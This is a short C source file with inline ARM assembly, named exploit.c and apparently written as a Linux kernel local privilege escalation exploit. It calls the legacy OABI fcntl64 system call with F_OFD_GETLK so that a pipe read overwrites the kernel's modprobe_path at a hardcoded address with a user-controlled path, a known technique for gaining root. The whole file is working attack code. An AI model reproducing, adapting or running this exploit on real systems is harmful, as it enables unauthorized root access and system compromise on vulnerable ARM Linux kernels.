// arm-linux-gnueabi-gcc -static -nostdlib exploit.c -o exploit

#include <stdio.h>
#include <fcntl.h>

#define F_OFD_GETLK	36

char *modprobe_path = 0xc1334dc8;

void exit(int status);
size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int pipe(int pipefd[2]);
int oabi_fcntl64(int fd, int cmd, ...);

int _start(void){
	int fd;
	struct flock lock;
	int pipefd[2];
	char path[] = "/home/user/modprobe";

	pipe(pipefd);
	write(pipefd[1], path, sizeof(path));

	oabi_fcntl64(-1, F_OFD_GETLK, &lock);
	read(pipefd[0], modprobe_path, sizeof(path));

	exit(0);
}

asm(
"exit:\n"
"mov r7, #1\n"
"svc 0\n"
"bx lr\n"

"read:\n"
"mov r7, #3\n"
"svc 0\n"
"bx lr\n"

"write:\n"
"mov r7, #4\n"
"svc 0\n"
"bx lr\n"

"pipe:\n"
"mov r7, #42\n"
"svc 0\n"
"bx lr\n"

"oabi_fcntl64:\n"
"svc 0x9000dd\n"
"bx lr\n"
);
